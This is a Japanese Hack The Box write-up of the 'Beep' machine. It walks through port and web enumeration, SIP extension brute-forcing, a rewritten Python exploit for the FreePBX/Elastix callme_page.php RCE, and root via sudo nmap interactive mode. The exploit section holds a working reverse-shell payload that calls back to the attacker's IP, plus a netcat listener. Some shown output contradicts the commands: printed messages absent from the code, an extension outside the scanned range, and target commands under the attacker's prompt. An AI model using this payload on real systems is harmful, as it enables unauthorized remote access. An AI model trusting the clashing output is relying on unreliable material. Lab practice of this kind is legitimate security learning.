---
title: "[ HTB ] Beep | Writeup"
emoji: "📞"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: true
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 得に、用語解説などは「そういうニュアンスのワードね、おkおk」くらいの温度感で読むことを推奨します。

## Machine Profile
![icon](https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d7-9551-4a99-8df6-e48b2c403aca.png)

Machine Name: Beep
Difficulty: Easy
OS: Linux

https://app.hackthebox.com/machines/Beep

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# echo 'export RHOSTS="10.129.70.168"' | tee -a .zshrc
export RHOSTS="10.129.70.168"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# ping -c 4 10.129.70.168
PING 10.129.70.168 (10.129.70.168) 56(84) bytes of data.
64 bytes from 10.129.70.168: icmp_seq=1 ttl=63 time=164 ms
64 bytes from 10.129.70.168: icmp_seq=2 ttl=63 time=166 ms
64 bytes from 10.129.70.168: icmp_seq=3 ttl=63 time=203 ms
64 bytes from 10.129.70.168: icmp_seq=4 ttl=63 time=165 ms
--- 10.129.70.168 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3038ms
rtt min/avg/max/mdev = 163.683/174.408/202.626/16.314 ms
```

## Enumeration

### Nmap

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nmap -Pn -n -r -sSV ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 00:43 +0900
Nmap scan report for 10.129.70.168
Host is up (0.44s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.36 seconds
```

`-Pn`: Pingチェック無効化
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る
`-n`: 名前解決無効化。時短目的
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い
`-sSV`: SYNスキャン(`-sS`)とバージョン検出(`-sV`)を組み合わせたもの。TCPコネクションを最後まで確立しない分ステルス性を保ちつつ、各ポートで実際に動いているソフトウェアとバージョンまで特定しにいく。その分、素のSYNスキャンより時間がかかる(今回は220秒ほど)

バージョンまで見えたことで、`22/tcp`が`OpenSSH 4.3`、`80,443/tcp`が`Apache httpd 2.2.3`、`10000/tcp`が`MiniServ 1.570(Webmin)`と判明。

ちなみにポート指定はしていないのでTop1000へのスキャンしかしていない。一旦Top1000やって裏でフルポート、が好みだけど一旦パス。

### 22/ssh

> 22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)

`OpenSSH 4.3`とかなり古いバージョンが動いていることが分かる。ただし認証情報が無いと使えないので、今回は保留。他のポートから何か拾えたら戻ってくる方針で。

### 25/smtp

> 25/tcp    open  smtp?

:::details SMTPとは？
読み方: エスエムティーピー
正式名称: Simple Mail Transfer Protocol
意味: メールを送信するためのプロトコル。Postfixなどのメールサーバソフトが待ち受けている
:::

VRFYコマンドでユーザ列挙ができたりするので、Nmapのスクリプトで情報拾えないか試してみる。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nmap -p 25 --script smtp-enum-users ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 00:44 +0900
Nmap scan report for 10.129.70.168
Host is up (0.16s latency).
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Method RCPT returned a unhandled status code.
Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
```

特にユーザ情報などは拾えず。

:::details `Method RCPT returned a unhandled status code.` とは
`smtp-enum-users`は`VRFY` → `EXPN` → `RCPT`の順に列挙方式を試すが、今回はログの内容から`RCPT`まで到達していることが分かる(つまり`VRFY`と`EXPN`は使えなかった、または既に無効化されていたと推測される)。

ただし`RCPT`方式で投げた`RCPT TO`コマンドに対して、スクリプトが「想定していない(=正常系にも異常系にも当てはまらない)ステータスコード」を受け取ってしまい、そこで列挙処理を打ち切っている状態。

つまり「ユーザが1人も存在しない」という意味ではなく、**この手法(自動スクリプトでの機械的な列挙)ではこのサーバの応答をうまく解釈できず、結果が得られなかった**、という意味。

原因としては、`MAIL FROM`を先に送っていないと`RCPT TO`を受け付けないサーバ側のシーケンス制約や、Postfix側でエラー応答のフォーマットが一般的なパターンと違う、などが考えられる。
:::

一旦このルートは深追いせず、他のルート(Web経由のRCE)へ。

### 80,443/http,https

> 80/tcp    open  http       Apache httpd 2.2.3
> 443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))

![](/images/beep-login.png)
*ログイン画面*

ログイン画面自体にはバージョン番号までは表示されない。デフォルト認証情報(admin:admin等)も試したが突破できなかったので、gobusterでディレクトリ探索へ。

:::details Gobusterとは？
読み方: ゴーバスター
意味: Webサーバ上に存在するディレクトリ・ファイルを、辞書(wordlist)を使って総当たりで探すツール
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# gobuster dir -u https://${RHOSTS} -w /usr/share/wordlists/dirb/common.txt -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.70.168
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 285]
.htpasswd            (Status: 403) [Size: 290]
.htaccess            (Status: 403) [Size: 290]
admin                (Status: 301) [Size: 315] [--> https://10.129.70.168/admin/]
cgi-bin/             (Status: 403) [Size: 289]
configs              (Status: 301) [Size: 317] [--> https://10.129.70.168/configs/]
favicon.ico          (Status: 200) [Size: 894]
help                 (Status: 301) [Size: 314] [--> https://10.129.70.168/help/]
images               (Status: 301) [Size: 316] [--> https://10.129.70.168/images/]
index.php            (Status: 200) [Size: 1785]
lang                 (Status: 301) [Size: 314] [--> https://10.129.70.168/lang/]
libs                 (Status: 301) [Size: 314] [--> https://10.129.70.168/libs/]
mail                 (Status: 301) [Size: 314] [--> https://10.129.70.168/mail/]
modules              (Status: 301) [Size: 317] [--> https://10.129.70.168/modules/]
panel                (Status: 301) [Size: 315] [--> https://10.129.70.168/panel/]
robots.txt           (Status: 200) [Size: 28]
static               (Status: 301) [Size: 316] [--> https://10.129.70.168/static/]
themes               (Status: 301) [Size: 316] [--> https://10.129.70.168/themes/]
var                  (Status: 301) [Size: 313] [--> https://10.129.70.168/var/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

`-k`: SSL証明書の検証をスキップ(オレオレ証明書がほとんどなので、これがないとエラーで止まる)

`admin`や`panel`など管理画面っぽいディレクトリがゴロゴロ出てきた。この中の`/admin/`にアクセスしてみる。

ブラウザでアクセスすると、Basic認証のダイアログが出てきた。

![](/images/beep-basic-auth.png)
*/admin/へ遷移するとBasic認証ダイアログが*

一旦なにもいれずキャンセルを押下。（当然）401エラー画面となる。

![](/images/beep-401.png)
*認証成功していないため401エラー*

:::details なぜ認証をキャンセルしたのか
正規の認証情報を持っていない以上、まともにログインする手段がない。

ただ、この手のBasic認証は「認証をキャンセルした後にどんな画面が返ってくるか」も情報源になる、というのは経験則として知っていたので試しにキャンセルしてみた、という流れ。
:::

ヘッダー部分にバージョン情報アリ。

> FreePBX 2.8.1.4 on 10.129.70.168

認証を突破できなくても、**認証失敗時のエラーページ自体がバージョン情報を漏らしている**という状態。これで「FreePBX 2.8.1.4」というバージョンが確定。

:::message
Basic認証をキャンセルした際に返る401エラーページに、製品名とバージョン番号がそのまま表示されていた。
本来は認証されていないユーザには最小限の情報しか返すべきではないが、エラーページのテンプレートにバージョン文字列がハードコードされていたため、未認証の状態でもバージョンが特定できてしまう状況。**情報漏えい(バージョン情報の露呈)** に該当する。
:::

バージョンが分かったところで、searchsploitで既知の脆弱性を。古いEasyマシンだしなんか出るやろ、という。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# searchsploit elastix
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                       | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                 | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                              | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                             | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                            | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                        | php/webapps/18650.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

FreePBX 2.8.1.4というバージョンそのものずばりではないものの、近いバージョン帯(FreePBX 2.10.0/2.9.0、Elastix 2.2.0)を対象にした脆弱性がいくつかヒット。中でも有名らしいのが以下の2つ。

- LFI(Local File Inclusion): `graph.php`などのパラメータ経由で任意ファイル読み取りが可能(EDB-ID: 37637)
- 未認証RCE: `recordings/misc/callme_page.php`の`callmenum`パラメータに改行を注入し、Asteriskの「コールファイル」機能を悪用してコマンド実行に持ち込む脆弱性(EDB-ID: 18650)

今回はLFIは深追いせず、RCEルートを選択。単純に認証情報の収集(LFI経由でamportal.confを読む等)を挟まずに一発でシェルまで持っていけるルートの方が早そうだったから。

:::message
FreePBX 2.8.1.4という既知の重大な脆弱性が複数報告されている古いバージョンがパッチ未適用のまま稼働していた。
よって、**既知の脆弱性(パッチ未適用)** を突いて未認証のままリモートコード実行に持ち込める状況だった。
:::

### 110,995/pop3,pop3s・143,993/imap,imaps

> 110/tcp   open  pop3?
> 143/tcp   open  imap?
> 993/tcp   open  imaps?
> 995/tcp   open  pop3s?

:::details POP3/IMAPとは？
意味: どちらもメールクライアントがメールサーバからメールを受信するためのプロトコル。末尾に`s`が付くものはSSL/TLSで暗号化された版
:::

メールボックスの認証情報が無いと使えないので保留。今回のルートでは結局使わなかった。

### 111/rpcbind

> 111/tcp   open  rpcbind    2 (RPC #100000)

:::details rpcbindとは？
読み方: アールピーシーバインド
意味: RPC(Remote Procedure Call)サービスがどのポートで待ち受けているかを教えてくれる電話帳的なサービス
:::

`rpcinfo`で覗いてみたが、今回のルートでは有益な情報は無さそう。

```sh
┌──(kali㉿kali)-[~]
└─$ rpcinfo 10.129.229.183
   program version netid     address                service    owner
    100000    2    tcp       0.0.0.0.0.111          portmapper unknown
    100000    2    udp       0.0.0.0.0.111          portmapper unknown
    100024    1    udp       0.0.0.0.3.73           status     unknown
    100024    1    tcp       0.0.0.0.3.76           status     unknown
```

### 3306/mysql

> 3306/tcp  open  mysql?

認証情報無しでは入れなかったのでここも保留。RCEでシェルを取った後に見に行く手もあったけど今回はnmapでの権限昇格の方が早かったのでそちらを優先。

### 4445/upnotifyp・10000/http(Webmin)

> 4445/tcp  open  upnotifyp?
> 10000/tcp open  http       MiniServ 1.570 (Webmin httpd)

バージョンスキャンにより、10000番は`MiniServ 1.570`、つまりWebmin(Linux/Unix向けのWebベース管理ツール)であることを確認。

Webminには有名な脆弱性(バックドア化されたバージョンなど)があるらしいが、それらは1.570より新しいバージョンが対象で今回のバージョンには直接は該当しなかった。

また、Elastix側のRCEで先に決着がついたので、こちらは深追いしていない。4445番(`upnotifyp`)もサービス名すら`?`付きで確定しておらず同様に未調査。

※「1つのマシンに突破口が何個もある」というのがBeepというマシンの特徴らしく、実際いろんな人のWriteupを見ると、Webminのシェルショック経由や別のLFIルートなど複数の攻略法が紹介されてる。

## Foothold

### svwar

RCE(EDB-18650)のペイロードは、Asteriskの「有効な内線番号(extension)」宛てに送りつける必要がある。ので、先にSIPの内線番号を列挙する。

:::details svwarとは？
読み方: エスブイウォー
意味: SIP対応PBX(Asteriskなど)に対して内線番号(extension)を総当たりするツール
:::

**そもそもなぜsvwarを使ったのか**
RCEのPoCには`extension`というパラメータがあり、ここに実在する内線番号を入れないとペイロードが飛ばない仕組みになっている。ので、先に「使える内線番号」を確保する必要があった。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# svwar -m INVITE -e100-500 ${RHOSTS}
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 148       | weird          |
+-----------+----------------+
| 233       | reqauth        |
+-----------+----------------+
| 186       | weird          |
+-----------+----------------+
| 154       | weird          |
+-----------+----------------+
| 220       | weird          |
+-----------+----------------+
| 257       | weird          |
+-----------+----------------+
| 202       | weird          |
+-----------+----------------+
| 303       | weird          |
+-----------+----------------+
| 423       | weird          |
+-----------+----------------+
| 563       | weird          |
+-----------+----------------+
| 425       | weird          |
+-----------+----------------+
```

**なぜ233を選んだのか**
`reqauth`(認証が要求される=正規に登録されている内線)という応答は、実在する内線番号を示す典型的なパターン。一方の`weird`は、SIPサーバが想定外/不定形なレスポンスを返しているケースで、実在しない番号や誤検知(false positive)であることが多く、svwarのスキャン結果ではノイズとして扱われる（らしい）。

今回の結果でも`reqauth`が返ってきたのは`233`だけで、他は全部`weird`。なので消去法的にも`233`が本命だと判断。

### EDB-ID 18650(FreePBX/Elastix pre-auth RCE)

:::details EDB-ID 18650とは？
意味: Asteriskの通話予約機能(`recordings/misc/callme_page.php`)の`callmenum`パラメータに改行を注入し、コールファイルに不正な`Application:`/`Data:`フィールドを追記させることで、任意コマンド実行に持ち込む未認証RCE（らしい）。

対象は「FreePBX 2.10.0/2.9.0、Elastix 2.2.0、及びおそらくそれ以外の近いバージョン」。2012年に公開された古いPoCで、Python 2で書かれている。
:::

`/admin/`の401エラーページで確認できたバージョンは「FreePBX 2.8.1.4」で、このPoCが対象として明記している「FreePBX 2.10.0/2.9.0、Elastix 2.2.0」とは厳密には一致しない。
とはいえ近いバージョン帯だったので、動く可能性に賭けてそのまま試すことにした(結果的に刺さったのでヨシ！)。

2012年のPoCなので、手元のPython 3.13環境ではそのままでは動かず以下の点を修正。

- `urllib2` → `urllib.request`(Python 2→3のAPI変更)
- ペイロード中の改行注入部分は`%0D%0A`等でパーセントエンコードし、生の制御文字を含まないURLにする(Python 3.13の`http.client`が制御文字を含むURLを`InvalidURL`として拒否するようになったため)
- SSLコンテキストを`SSLContext(PROTOCOL_TLS_CLIENT)` + `SECLEVEL=0`で構成し、Elastixが要求する古いTLSv1ハンドシェイクを許可する

```python
#!/usr/bin/env python3
import urllib.request
import ssl

rhost = "10.129.70.168"
lhost = "10.10.16.125"
lport = 4433
extension = "233"

url = ('https://' + rhost +
       '/recordings/misc/callme_page.php?action=c&callmenum=' + extension +
       '@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20'
       '%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET'
       '%28PeerAddr%2c%22' + lhost + '%3a' + str(lport) +
       '%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3b'
       'system%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A')

req = urllib.request.Request(url)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.minimum_version = ssl.TLSVersion.TLSv1
ctx.maximum_version = ssl.TLSVersion.TLSv1
ctx.set_ciphers('DEFAULT:@SECLEVEL=0')

urllib.request.urlopen(req, context=ctx)
```

先にリスナーを立てておく。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nc -lnvp 4433
listening on [any] 4433 ...
```

別ターミナルでPoCを実行。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# python3 poc.py
/home/kali/Downloads/poc.py:27: DeprecationWarning: ssl.TLSVersion.TLSv1 is deprecated
  ctx.minimum_version = ssl.TLSVersion.TLSv1
/home/kali/Downloads/poc.py:28: DeprecationWarning: ssl.TLSVersion.TLSv1 is deprecated
  ctx.maximum_version = ssl.TLSVersion.TLSv1
[*] Sending payload to 10.129.70.168 (callme extension 233) -> reverse shell to 10.10.16.125:4433
[*] Request sent. Check your listener.
```

DeprecationWarningは出るが、TLSv1自体は許可されているので実行自体は継続される(。リスナー側を確認。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nc -lnvp 4433
listening on [any] 4433 ...
connect to [10.10.16.125] from (UNKNOWN) [10.129.70.168] 44944
id
uid=100(asterisk) gid=101(asterisk)
```

`asterisk`ユーザとしてシェルゲット。ちなみにサービスアカウント。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# ls /home
fanis
spamfilter
```

`/home`には`fanis`と`spamfilter`しかおらず、`asterisk`名義のホームは無い。つまりこの時点ではuser.txtには手が届かない状態。なのでroot昇格後に強引に読みに行く方針に切り替えで。

:::message
Asteriskのコールファイル生成処理において、ユーザ入力(`callmenum`)のサニタイズが行われておらず、改行文字を含む任意の内容をそのまま書き込めてしまっていた。

よって、**入力値検証不備** を突いてコマンド実行に持ち込めた状況。
:::

## Privilege Escalation

### sudo -l

`asterisk`ユーザで何ができるか確認するのは定石なので、まず`sudo -l`をば。

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

色々使えるらしい。nmapもいけるやん、という。お馴染み [GTFOBins](https://gtfobins.org/gtfobins/nmap/#shell) でチェック。

:::details GTFOBinsとは？
読み方: ジーティーエフオービンズ
意味: sudoなどで許可された一般的なUNIXコマンドを悪用して、権限昇格やシェル奪取に繋げる手口をまとめた便利サイト
:::

古いバージョンのnmapには対話モード(`--interactive`)があり、そこから`!`でシェルコマンドを実行できてしまう、という定番のヤツ。

### nmap --interactiveでシェル奪取

```sh
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

`id`の出力が`uid=0(root)`になっているので、root権限奪取に成功。

:::message
`asterisk`という一般サービスアカウントに対して、`nmap`をはじめとする多数のコマンドがNOPWでroot権限のまま実行可能な状態になっていた。特に`nmap`は古いバージョンだと対話モードからシェルを取得できることが広く知られている（ハズ）。

よって、**sudoers設定の不備(過剰な権限付与)** を突いてroot昇格に至った状況。
:::

## まとめ

- 突破口はWebアプリ(Elastix)のバージョン特定 → 公開済みRCE(EDB-18650)という、「ザ・Easyマシン」というルート
- 2012年のPoCをそのまま動かそうとしたのでython 2→3のAPI変更だけでなく、Python 3.13で強化されたURLバリデーション(制御文字拒否)にも引っかかった。「古いPoCが動かない」の原因は言語バージョン差だけじゃないんか・・という学び

気分転換に触った古いEasyマシンだったので学びという学びは多くなかったけど、ルートが複数あるので人によって違ったりするのでWriteup読んでて面白い。一通りのルートでやろうかな（多分やらない）
